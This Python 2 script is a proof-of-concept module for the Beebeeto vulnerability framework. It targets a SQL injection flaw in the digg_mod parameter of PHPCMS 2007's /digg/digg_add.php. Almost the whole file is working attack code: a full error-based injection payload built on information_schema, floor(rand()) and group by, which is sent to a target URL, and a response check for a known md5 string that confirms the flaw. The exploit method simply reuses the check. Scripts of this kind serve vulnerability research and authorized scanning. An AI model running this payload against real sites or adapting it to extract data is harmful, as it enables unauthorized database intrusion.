#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0169',
            'name': 'PHPCMS 2007 /digg_add.php SQL注入漏洞 POC',
            'author': '1024',
            'create_date': '2014-11-30',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'PHPCMS',
            'vul_version': ['2007'],
            'type': 'SQL Injection',
            'tag': ['PHPCMS漏洞', 'SQL注入漏洞', '/digg_add.php', 'php'],
            'desc': 'PHPCMS 2007 /digg_add.php mod参数未过滤带入sql语句导致SQL注入',
            'references': ['N/A',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ("/digg/digg_add.php?id=1&con=2&digg_mod=digg_data WHERE 1=2 +and(select 1 from("
                   "select count(*),concat((select (select (select concat(0x7e,md5(3.1415),0x7e))) from "
                   "information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema."
                   "tables group by x)a)%23")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '63e1f04640e83605c1d177544a5a0488' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())